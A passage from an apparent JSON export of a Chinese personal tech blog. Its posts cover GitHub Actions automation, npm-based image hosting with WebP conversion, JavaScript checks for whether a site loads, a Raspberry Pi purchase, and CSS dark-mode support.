class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span 